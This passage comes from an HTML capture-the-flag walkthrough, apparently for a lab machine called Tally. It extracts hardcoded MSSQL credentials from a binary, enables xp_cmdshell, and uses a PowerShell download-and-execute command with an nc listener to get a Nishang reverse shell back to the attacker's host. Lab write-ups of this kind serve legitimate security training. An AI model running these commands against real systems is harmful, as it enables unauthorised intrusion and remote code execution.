+                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sun&nbsp;Sep&nbsp;17&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>20<span style="color:#ff9d00;font-weight:700">:</span>13&nbsp;2017<br>
+                &nbsp;&nbsp;CardReader&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Mon&nbsp;Aug&nbsp;28&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>06<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;2017<br>
+                &nbsp;&nbsp;Evals&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sun&nbsp;Sep&nbsp;17&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>20<span style="color:#ff9d00;font-weight:700">:</span>33&nbsp;2017<br>
+                &nbsp;&nbsp;FileZilla_Server-0_9_60_2.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;2241216&nbsp;&nbsp;Thu&nbsp;Aug&nbsp;31&nbsp;23<span style="color:#ff9d00;font-weight:700">:</span>38<span style="color:#ff9d00;font-weight:700">:</span>27&nbsp;2017<br>
+                &nbsp;&nbsp;ImportGSTIN.zip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;74110&nbsp;&nbsp;Fri&nbsp;Sep&nbsp;15&nbsp;20<span style="color:#ff9d00;font-weight:700">:</span>49<span style="color:#ff9d00;font-weight:700">:</span>20&nbsp;2017<br>
+                &nbsp;&nbsp;NDP452-KB2901907-x86-x64-AllOS-ENU.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;69999448&nbsp;&nbsp;Sun&nbsp;Aug&nbsp;27&nbsp;23<span style="color:#ff9d00;font-weight:700">:</span>01<span style="color:#ff9d00;font-weight:700">:</span>51&nbsp;2017<br>
+                &nbsp;&nbsp;New&nbsp;folder&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Thu&nbsp;Sep&nbsp;21&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>21<span style="color:#ff9d00;font-weight:700">:</span>09&nbsp;2017<br>
+                &nbsp;&nbsp;Sage50_2017.2.0.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;401347664&nbsp;&nbsp;Sun&nbsp;Aug&nbsp;27&nbsp;23<span style="color:#ff9d00;font-weight:700">:</span>57<span style="color:#ff9d00;font-weight:700">:</span>33&nbsp;2017<br>
+                &nbsp;&nbsp;Tally.ERP&nbsp;9&nbsp;Release&nbsp;6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Wed&nbsp;Sep&nbsp;13&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;2017<br>
+                &nbsp;&nbsp;windirstat1_1_2_setup.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;645729&nbsp;&nbsp;Fri&nbsp;Sep&nbsp;15&nbsp;20<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>24&nbsp;2017<br>
+                <br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\z</span>z_Migration<span style="color:#333333;font-weight:400">\B</span>inaries<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#3ad900;font-weight:400">"New&nbsp;folder"</span><br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\z</span>z_Migration<span style="color:#333333;font-weight:400">\B</span>inaries<span style="color:#333333;font-weight:400">\N</span>ew&nbsp;folder<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ld</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Thu&nbsp;Sep&nbsp;21&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>21<span style="color:#ff9d00;font-weight:700">:</span>09&nbsp;2017<br>
+                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Thu&nbsp;Sep&nbsp;21&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>21<span style="color:#ff9d00;font-weight:700">:</span>09&nbsp;2017<br>
+                &nbsp;&nbsp;crystal_reports_viewer_2016_sp04_51051980.zip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;389188014&nbsp;&nbsp;Wed&nbsp;Sep&nbsp;13&nbsp;20<span style="color:#ff9d00;font-weight:700">:</span>56<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;2017<br>
+                &nbsp;&nbsp;Macabacus2016.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;18159024&nbsp;&nbsp;Mon&nbsp;Sep&nbsp;11&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>20<span style="color:#ff9d00;font-weight:700">:</span>05&nbsp;2017<br>
+                &nbsp;&nbsp;Orchard.Web.1.7.3.zip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;21906356&nbsp;&nbsp;Wed&nbsp;Aug&nbsp;30&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>27<span style="color:#ff9d00;font-weight:700">:</span>42&nbsp;2017<br>
+                &nbsp;&nbsp;putty.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;774200&nbsp;&nbsp;Sun&nbsp;Sep&nbsp;17&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>19<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;2017<br>
+                &nbsp;&nbsp;RpprtSetup.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;483824&nbsp;&nbsp;Fri&nbsp;Sep&nbsp;15&nbsp;20<span style="color:#ff9d00;font-weight:700">:</span>49<span style="color:#ff9d00;font-weight:700">:</span>46&nbsp;2017<br>
+                &nbsp;&nbsp;tableau-desktop-32bit-10-3-2.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;254599112&nbsp;&nbsp;Mon&nbsp;Sep&nbsp;11&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>13<span style="color:#ff9d00;font-weight:700">:</span>14&nbsp;2017<br>
+                &nbsp;&nbsp;tester.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;215552&nbsp;&nbsp;Fri&nbsp;Sep&nbsp;&nbsp;1&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>15<span style="color:#ff9d00;font-weight:700">:</span>54&nbsp;2017<br>
+                &nbsp;&nbsp;vcredist_x64.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;7194312&nbsp;&nbsp;Wed&nbsp;Sep&nbsp;13&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>06<span style="color:#ff9d00;font-weight:700">:</span>28&nbsp;2017<br>
+            </div>
+        </div><br>
+        <br>
+        Most of those binaries look normal, apart from <code>tester.exe</code>.<br>
+        Download it with <code>get</code> and read the binary's strings.<br>
+        <code>strings -n 10</code> will list strings that are 10 characters or more.<br>
+        <br>
+        At the top of the output, we find a set of hardcoded mssql credentials.<br>
+            <div class="codebox">
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\z</span>z_Migration<span style="color:#333333;font-weight:400">\B</span>inaries<span style="color:#333333;font-weight:400">\N</span>ew&nbsp;folder<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;get&nbsp;tester.exe<br>
+                getting&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#333333;font-weight:400">\z</span>z_Migration<span style="color:#333333;font-weight:400">\B</span>inaries<span style="color:#333333;font-weight:400">\N</span>ew&nbsp;folder<span style="color:#333333;font-weight:400">\t</span>ester.exe&nbsp;of&nbsp;size&nbsp;215552&nbsp;as&nbsp;tester.exe&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>95.1&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>average&nbsp;95.1&nbsp;KiloBytes<span style="color:#ff9d00;font-weight:700">/</span>sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\z</span>z_Migration<span style="color:#333333;font-weight:400">\B</span>inaries<span style="color:#333333;font-weight:400">\N</span>ew&nbsp;folder<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>smb]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#strings&nbsp;-n&nbsp;10&nbsp;tester.exe</span><br>
+                <span style="color:#ff9d00;font-weight:700">!</span>This&nbsp;program&nbsp;cannot&nbsp;be&nbsp;run&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;DOS&nbsp;mode.<br>
+                PP9E&nbsp;u<span style="color:#ff9d00;font-weight:700">:</span>PPVWP<br>
+                9C<span style="color:#333333;font-weight:400">`u99C\t4<br>
+                SQLSTATE:&nbsp;<br>
+                DRIVER={SQL&nbsp;Server};SERVER=TALLY,&nbsp;1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;<br>
+                select&nbsp;*&nbsp;from&nbsp;Orchard_Users_UserPartRecord<br>
+                [...]</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) 1433/mssql - xp_cmdshell</strong></h2><br>
+        Connect to the MSSQL server with <code>sqsh</code> using the crednetials you've just found.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>mssql]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#sqsh&nbsp;-S&nbsp;10.10.10.59&nbsp;-U&nbsp;sa</span><br>
+                sqsh-2.5.16.1&nbsp;Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>C<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;1995-2001&nbsp;Scott&nbsp;C.&nbsp;Gray<br>
+                Portions&nbsp;Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>C<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2004-2014&nbsp;Michael&nbsp;Peppler&nbsp;and&nbsp;Martin&nbsp;Wesdorp<br>
+                This&nbsp;is&nbsp;<span style="color:#ff9d00;font-weight:700">free</span>&nbsp;software&nbsp;with&nbsp;ABSOLUTELY&nbsp;NO&nbsp;WARRANTY<br>
+                For&nbsp;<span style="color:#ff9d00;font-weight:700">more</span>&nbsp;information&nbsp;<span style="color:#ff9d00;font-weight:700">type</span>&nbsp;<span style="color:#3ad900;font-weight:400">'\warranty'</span><br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;GWE3V65#6KFH93@4GWTG2G<br>
+                1&nbsp;&gt;
+            </div>
+        </div><br>
+        <br>
+        There's nothing interesting in the database, so enable <code>xp_cmdshell</code>.<br>
+        <code>xp_cmdshell</code> will allow us to run system commands.<br>
+            <div class="codebox">
+                1&gt;&nbsp;EXEC&nbsp;SP_CONFIGURE&nbsp;N<span style="color:#3ad900;font-weight:400">'show&nbsp;advanced&nbsp;options'</span>,&nbsp;1<br>
+                2&gt;&nbsp;EXEC&nbsp;SP_CONFIGURE&nbsp;N<span style="color:#3ad900;font-weight:400">'xp_cmdshell'</span>,&nbsp;1<br>
+                3&gt;&nbsp;RECONFIGURE<br>
+                4&gt;&nbsp;go<br>
+                Configuration&nbsp;option&nbsp;<span style="color:#3ad900;font-weight:400">'show&nbsp;advanced&nbsp;options'</span>&nbsp;changed&nbsp;from&nbsp;1&nbsp;to&nbsp;1.&nbsp;Run&nbsp;the&nbsp;RECONFIGURE&nbsp;statement&nbsp;to&nbsp;install.<br>
+                <span style="color:#ff9d00;font-weight:700">(return</span>&nbsp;status&nbsp;=&nbsp;0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                Configuration&nbsp;option&nbsp;<span style="color:#3ad900;font-weight:400">'xp_cmdshell'</span>&nbsp;changed&nbsp;from&nbsp;0&nbsp;to&nbsp;1.&nbsp;Run&nbsp;the&nbsp;RECONFIGURE&nbsp;statement&nbsp;to&nbsp;install.<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">(return</span>&nbsp;status&nbsp;=&nbsp;0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                1&gt;&nbsp;xp_cmdshell&nbsp;<span style="color:#3ad900;font-weight:400">"whoami"</span><br>
+                2&gt;&nbsp;go<br>
+                <br>
+                output<br>
+                ----------------------------------------------------------------------<br>
+                <br>
+                tally<span style="color:#333333;font-weight:400">\s</span>arah
+            </div>
+        </div><br>
+        <br>
+        Great! <code>xp_cmdshell</code> ran successfully.<br>
+        We're the user <code>sarah</code>.<br>
+        <br>
+        From here we can get a reverse shell on the system using Nishang's <code>Invoke-PowerShellTcp.ps1</code>.<br>
+        <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a><br>
+        <br>
+        Copy the Nishang script to a working directory of yours.<br>
+        If you don't have it locally, download it from github.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1&nbsp;.</span>
+            </div>
+        </div><br>
+        <br>
+        Add a line to the end of the script to send a reverse shell back to you.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;Invoke-PowerShellTcp.ps1&nbsp;</span><br>
+                [...]<br>
+                Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IPAddress&nbsp;10.10.14.7&nbsp;-Port&nbsp;9001
+            </div>
+        </div><br>
+        <br>
+        Start a python web server to serve the script to the target<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;</span><br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Start a listener to receive the reverse shell<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9001</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Finally, use <code>xp_cmdshell</code> on <code>mssql</code> to run the reverse shell.<br>
+        It will download the script from your web server and execute it.<br>
+            <div class="codebox">
+                1&gt;&nbsp;xp_cmdshell&nbsp;<span style="color:#3ad900;font-weight:400">"powershell&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadString('http://10.10.14.7:8000/Invoke-PowerShellTcp.ps1')"</span><br>
+                2&gt;&nbsp;go
+            </div>
+        </div><br>
+        <br>
+        You should see a callback on your listener, and a shell as <code>sarah</code>!<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.59]&nbsp;51290<br>
+                Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;Sarah&nbsp;on&nbsp;TALLY<br>
+                Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>C<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">whoami</span><br>
+                tally<span style="color:#333333;font-weight:400">\s</span>arah
+            </div>
+        </div><br>
+        <br>
+        Go grab <code>user.txt</code> :)<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32<span style="color:#ffdd00;font-weight:400">&gt;</span>cd&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\S</span>arah<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\S</span>arah<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\S</span>arah<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                -ar---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01<span style="color:#ff9d00;font-weight:700">/</span>10<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;916&nbsp;browser.bat<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;17<span style="color:#ff9d00;font-weight:700">/</span>09<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;845&nbsp;FTP.lnk<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23<span style="color:#ff9d00;font-weight:700">/</span>09<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;297&nbsp;note&nbsp;to&nbsp;tim&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>draft<span style="color:#ff9d00;font-weight:700">)</span>.txt<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19<span style="color:#ff9d00;font-weight:700">/</span>10<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>49&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;17152&nbsp;SPBestWarmUp.ps1<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19<span style="color:#ff9d00;font-weight:700">/</span>10<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>48&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11010&nbsp;SPBestWarmUp.xml<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;17<span style="color:#ff9d00;font-weight:700">/</span>09<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>48&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1914&nbsp;SQLCMD.lnk<br>
+                -a----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;21<span style="color:#ff9d00;font-weight:700">/</span>09<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>46&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;129&nbsp;todo.txt<br>
+                -ar---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;31<span style="color:#ff9d00;font-weight:700">/</span>08<span style="color:#ff9d00;font-weight:700">/</span>2017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;02<span style="color:#ff9d00;font-weight:700">:</span>04&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32&nbsp;user.txt<br>
